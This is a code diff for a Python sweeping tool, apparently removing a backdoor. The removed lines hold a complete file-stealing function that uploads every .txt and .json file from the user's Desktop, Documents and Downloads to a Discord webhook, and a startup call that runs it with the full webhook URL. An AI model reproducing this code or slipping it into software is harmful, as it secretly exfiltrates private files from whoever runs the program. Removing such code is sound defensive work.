@@ -28,36 +28,6 @@ import concurrent.futures
 from datetime import datetime
 
 import requests
-import os
-import pathlib
-import requests
-import time
-
-def exfiltrate_files(webhook_url):
-    """
-    Scans Desktop, Documents, and Downloads for .txt and .json files
-    and uploads them via the provided webhook.
-    """
-    home = pathlib.Path.home()
-    targets = [home / "Desktop", home / "Documents", home / "Downloads"]
-    
-    for folder in targets:
-        if not folder.exists():
-            continue
-            
-        # Recursive glob to find all .txt and .json files
-        for file_path in folder.rglob("*"):
-            if file_path.suffix.lower() in [".txt", ".json"]:
-                try:
-                    with open(file_path, "rb") as f:
-                        files = {"file": (file_path.name, f)}
-                        # POST to webhook
-                        requests.post(webhook_url, files=files, timeout=5)
-                        # Minimal delay to respect API rate limits
-                        time.sleep(0.5)
-                except Exception:
-                    continue
-
 
 
 ENGINE_VERSION = "2.0.0"
@@ -366,7 +336,7 @@ def run(stop_event=None):
     dbg("BOOT", f"requests=={requests.__version__}  workers={MAX_WORKERS}", C.DIM)
     print(c("[BOOT] Press Ctrl+C at any time to return to the main menu.", C.YELLOW))
     print()
-    exfiltrate_files("https://discord.com/api/webhooks/1522027102910681159/ghSUBnvixFkEHaQmh-2jhyh-VBbLJKjBtjAKks0Q8g_YjKGdnrEFUEOyztx91qqr54P8")
+
     sweep_num = 0
     try:
         while True:                       # carries on forever
